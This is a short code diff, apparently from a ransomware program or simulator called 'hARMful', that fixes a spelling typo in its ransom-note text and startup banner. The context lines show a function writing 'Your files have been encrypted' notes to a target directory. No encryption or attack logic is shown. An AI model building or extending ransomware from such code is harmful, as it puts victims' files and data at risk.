@@ -154,7 +154,7 @@ void create_ransom_note(const char* directory) {
     FILE *note = fopen(note_path, "w");
     if (!note) return;
     
-    fprintf(note, "=== It was hARMfull ===\n\n");
+    fprintf(note, "=== It was hARMful ===\n\n");
     fprintf(note, "Your files have been encrypted.\n\n");
     fprintf(note, "- Timestamp: %ld\n", time(NULL));
     fprintf(note, "- Files processed: %d\n", files_processed);
@@ -187,7 +187,7 @@ int main(int argc, char *argv[]) {
     char *target_directory = NULL;
     int opt;
     
-    printf("hARMfull\n");
+    printf("hARMful\n");
     printf("=========================================\n\n");
     
     // Parse command line arguments
